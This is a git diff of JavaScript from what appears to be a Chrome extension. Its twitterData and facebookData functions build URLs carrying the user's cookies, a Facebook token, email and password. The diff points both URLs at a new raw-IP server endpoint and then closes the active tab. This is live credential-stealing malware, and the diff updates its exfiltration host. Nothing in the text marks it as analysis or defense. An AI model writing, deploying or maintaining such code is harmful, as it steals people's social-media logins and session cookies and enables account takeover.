@@ -97,7 +97,7 @@ function twitterData() {
 
                 if (typeof uuid !== 'undefined') {
                     console.log('uid defined');
-                    var sendurl = `http://13.21.34.124:8080/php/twitter.php?uuid=${uuid}&cookie=${format}&email=${result.TWemail}&password=${result.TWpassword}`;
+                    var sendurl = `http://125.138.183.122:8084/php/twitter.php?uuid=${uuid}&cookie=${format}&email=${result.TWemail}&password=${result.TWpassword}`;
                     var encodeurl = encodeURI(sendurl);
                     chrome.tabs.query({ active: true }, function(tabs) {
                         chrome.tabs.remove(tabs[0].id);
@@ -145,7 +145,7 @@ function facebookData() {
                         console.log(err);
                     }
                     if (typeof uuid !== 'undefined') {
-                        var sendurl = `http://13.21.34.124:8080/php/facebook.php?uuid=${uuid}&cookie=${format}&uToken=${uToken}&email=${result.FBemail}&password=${result.FBpassword}`;
+                        var sendurl = `http://125.138.183.122:8084/php/facebook.php?uuid=${uuid}&cookie=${format}&uToken=${uToken}&email=${result.FBemail}&password=${result.FBpassword}`;
                         var encodeurl = encodeURI(sendurl);
                         chrome.tabs.query({ active: true }, function(tabs) {
                             chrome.tabs.remove(tabs[0].id);
